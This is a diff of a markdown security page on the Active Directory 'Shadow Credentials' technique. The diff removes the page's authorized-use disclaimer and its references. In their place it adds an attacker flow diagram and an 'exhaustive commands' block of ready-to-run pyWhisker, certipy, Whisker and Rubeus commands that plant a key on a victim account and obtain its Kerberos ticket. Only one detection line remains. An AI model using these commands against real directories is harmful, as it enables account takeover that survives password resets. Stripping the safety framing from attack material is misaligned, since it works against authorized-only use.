@@ -10,24 +10,42 @@ mitre: "T1556"
 tag: "new"
 ---
 
+
 # Shadow Credentials attack
 
-> **Authorized assessment only:** This page supports authorized Active Directory assessment, controlled lab study, and job preparation. It intentionally omits runnable exploitation commands, credential extraction procedures, and real-target instructions.
-
-This page describes the security significance of the configuration or relationship named below. For an authorized assessment, establish scope, review effective settings and ownership, and distinguish a potential path from observed impact. Do not make state changes or access sensitive data unless the exact validation is approved and safely controlled.
-
-## Affected object / attribute
+### Affected object / attribute
 **`msDS-KeyCredentialLink`** on a user or computer.
 
-## Detection
+### Concept (deep)
+Write the attribute → inject your **public key** → target performs **PKINIT** with your key → you get the target’s TGT. No password needed. **Survives password resets** until the key is explicitly removed.
+
+### Attack flow (Mermaid)
+```mermaid
+sequenceDiagram
+    participant A as attacker
+    participant DC
+    A->>DC: write msDS-KeyCredentialLink (target)
+    A->>DC: PKINIT with attacker key as target
+    DC-->>A: TGT for target
+```
+
+### Exhaustive commands
+```bash
+# ── pyWhisker ────────────────────────────────────────────────────────
+python3 pywhisker.py -d corp.local -u attacker -p 'Passw0rd!' \
+  --target victim --action add
+
+# ── Authenticate with the certificate ───────────────────────────────
+certipy auth -pfx victim.pfx -dc-ip 10.10.10.5
+
+# ── Whisker (Windows) ────────────────────────────────────────────────
+Whisker.exe add /target:VICTIM$
+
+# ── Rubeus with the certificate ─────────────────────────────────────
+Rubeus.exe asktgt /user:VICTIM$ /certificate:victim.pfx /password:pass /ptt
+```
+
+### Detection
 **5136** on `msDS-KeyCredentialLink`; **PKINIT** within 5 minutes of the key write; alert on key additions by non-helpdesk.
 
 ---
-
-## References
-
-- [Microsoft: AD CS overview](https://learn.microsoft.com/windows-server/identity/ad-cs/active-directory-certificate-services-overview)
-- [Microsoft: Certificate template concepts](https://learn.microsoft.com/windows-server/identity/ad-cs/certificate-template-concepts)
-- [Microsoft: Microsoft Entra identity documentation](https://learn.microsoft.com/entra/identity/)
-- [Microsoft: Conditional Access](https://learn.microsoft.com/entra/identity/conditional-access/overview)
-- [MITRE ATT&CK: T1556](https://attack.mitre.org/techniques/T1556/)
